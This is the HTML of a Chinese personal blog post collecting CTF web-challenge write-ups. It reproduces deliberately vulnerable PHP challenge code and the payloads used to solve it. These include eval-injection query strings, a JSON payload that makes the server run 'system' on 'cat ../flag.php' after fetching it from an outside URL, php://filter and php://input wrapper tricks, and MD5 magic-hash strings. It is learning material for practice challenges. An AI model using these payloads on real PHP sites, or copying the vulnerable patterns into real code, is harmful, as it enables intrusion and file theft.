@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    ctf - 合集 |  Cat&#39;s blog
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  <link rel="stylesheet" href="/dist/main.css">
+  <link rel="stylesheet" href="/css/custom.css">
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-CTF-做题合集" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctf - 合集
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/10/24/CTF-做题合集/" class="article-date">
+  <time datetime="2019-10-24T13:02:54.218Z" itemprop="datePublished">2019-10-24</time>
+</a>
+      
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Wortzahl:</span>
+            <span class="post-count">1.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Lesezeit≈</span>
+            <span class="post-count">7 Minuten</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <p><excerpt in="" index="" |="" 首页摘要=""><br>自己后来做过的各种乱七八糟的题目<br><a id="more"></a></excerpt></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<h3 id="爱い窒息、痛-—-php源码阅读-让系统读木马"><a href="#爱い窒息、痛-—-php源码阅读-让系统读木马" class="headerlink" title="爱い窒息、痛 —- php源码阅读,让系统读木马"></a>爱い窒息、痛 —- php源码阅读,让系统读木马</h3><blockquote>
+<p>靶机：<a href="http://114.55.36.69:8020" target="_blank" rel="noopener">http://114.55.36.69:8020</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* vim: set expandtab tabstop=4 shiftwidth=4: */</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | PHP version 5                                                        |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Copyright (c) 1997-2004 The PHP Group                                |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | This source file is subject to version 3.0 of the PHP license,       |</span></span><br><span class="line"><span class="comment">// | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">// | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">// | http://www.php.net/license/3_0.txt.                                  |</span></span><br><span class="line"><span class="comment">// | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">// | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">// | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Authors: Original Author &lt;author@example.com&gt;                        |</span></span><br><span class="line"><span class="comment">// |          Your Name &lt;you@example.com&gt;                                 |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// $Id:$</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a); <span class="comment">// 关键是这个函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123; </span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b); <span class="comment">//这里要求从某个链接的文件读取json字符串，包含f，d字段的json，而且f，d里必须是一段木马，木马格式见下</span></span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]); <span class="comment">// 木马格式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>url方式，超过40个字符长度才可以进入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;<span class="comment">//url切分</span></span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;<span class="comment">//如果长度&gt;40,$f = a[30:35],$g = a[10:20]</span></span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入字符串示例： http://aaa.com/a.phpccccccccccflag0aaaaaaaaa</span></span><br></pre></td></tr></table></figure></p>
+<p>下面是需要让 file_get_contents($b) 访问到木马json文件的内容是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>, </span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span> </span><br><span class="line">); </span><br><span class="line">$url = json_encode($url); </span><br><span class="line"><span class="keyword">echo</span> $url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>构造成功之后是： </p>
+<blockquote>
+<p>{“f”:”system”,”d”:”cat ..\/flag.php”}</p>
+</blockquote>
+<h3 id="bugku-系列"><a href="#bugku-系列" class="headerlink" title="bugku 系列"></a>bugku 系列</h3><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><blockquote>
+<p><a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a></p>
+</blockquote>
+<ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123; <span class="comment">//正则匹配=&gt; /^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>); <span class="comment">// 执行命令代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>分析php的9大内置变量</p>
+<blockquote>
+<p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p>
+</blockquote>
+<p>得出令  args=GLOBALS  获得flag</p>
+<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>套路比较多，内容丰富，值得记录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// 获取hello参数</span></span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);  <span class="comment">// var_dump()输出文件信息，需要绕过</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>套路一 直接闭合var_dump </p>
+<blockquote>
+<p>hello=1);show_source(%27flag.php%27);var_dump(3<br><a href="http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)" target="_blank" rel="noopener">http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)</a></p>
+</blockquote>
+</li>
+<li><p>套路二 利用伪协议<br>直接使用post来使用伪协议</p>
+<blockquote>
+<p><a href="http://120.24.86.145:8003/index.php?hello=1);include" target="_blank" rel="noopener">http://120.24.86.145:8003/index.php?hello=1);include</a> $_POST[‘f’];//<br>在POST区域：f=php://filter/convert.base64-encode/resource=flag.php</p>
+</blockquote>
+</li>
+<li><p>套路三 直接来</p>
+<blockquote>
+<p>?hello=get_file_contents(‘flag.php’)<br>?hello=file(‘flag.php’)</p>
+</blockquote>
+</li>
+</ol>
+<p>总之是字符串拼接玩出了花·····emm</p>
+<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><ol>
+<li>看到备份首先想到 .bak  文件</li>
+<li>利用御剑工具扫描查看到 index.php ,猜测拿到index.php.bak</li>
+<li>套路：<br>1.) 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。<blockquote>
+<p>QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a<br>2.) 利用==漏洞，数组无法被识别，都是null</p>
+</blockquote>
+</li>
+<li>特色<br>$_SERVER[‘REQUEST_URI’]  用来获取url，可以当作get请求</li>
+</ol>
+<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>这个故事告诉我们，这狗题目说快速，就说明手动是绝对不行了，需要走脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/web6/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"> </span><br><span class="line">str=base64.b64decode(headers[<span class="string">'flag'</span>])</span><br><span class="line">str=str.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"> </span><br><span class="line">flag = base64.b64decode(str.split(<span class="string">':'</span>)[<span class="number">1</span>])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h4><p>靶机： <a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>
+<ol>
+<li>铺面的字符串是无效的</li>
+<li>发现在url中看到有base64编码的a2V5cy50eHQ= </li>
+<li>访问后发现依然是无效的字符串</li>
+<li>filenam顾名思义可以尝试伪协议，尝试无效</li>
+<li>盲猜filename是可以读取文件，尝试filename赋值为 index.php </li>
+<li>修改line的数据，发现可以读出一行的数据，写脚本读出index.php的完整代码</li>
+<li><p>脚本： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>) &#123;</span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list)) &#123;</span><br><span class="line">	$fa = file($file);</span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得出结论发现，cookie为margin=margin可以给文件读取的数组赋值给keys.php，则keys.php可能是最终结果隐藏的地方</p>
+</li>
+<li>在burpsuite中更改cookie<blockquote>
+<p>Cookie: margin=margin </p>
+</blockquote>
+</li>
+<li>keys.php进行base64编码后传入给filename,得出结果<h4 id="web8-姿势整合了"><a href="#web8-姿势整合了" class="headerlink" title="web8 姿势整合了"></a>web8 姿势整合了</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>可以看到ac = f 就行了 </p>
+<ol>
+<li>套路1：<br>看题目说txt 盲猜 flag.txt 直接拿到</li>
+<li>伪协议<br>ac = 5<br>fn = php://input<br>post数据 5<br>可以获得</li>
+</ol>
+</the>
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        Belohnung
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>Copyright-Hinweis： </strong>
+              Sofern nicht anders angegeben, liegt das Urheberrecht aller Artikel in diesem Blog beim Autor. Nachdruck bitte Quelle angeben!
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://runindark.com/2019/10/24/CTF-做题合集/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2019/10/25/hadoop/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            hadoop操作
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/10/21/CTF-杂记/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctf 杂录</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'monsterid',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2015-2020
+        夜小猫
+      </li>
+      <li>
+        
+        Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914"></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Cat&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/旅行/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
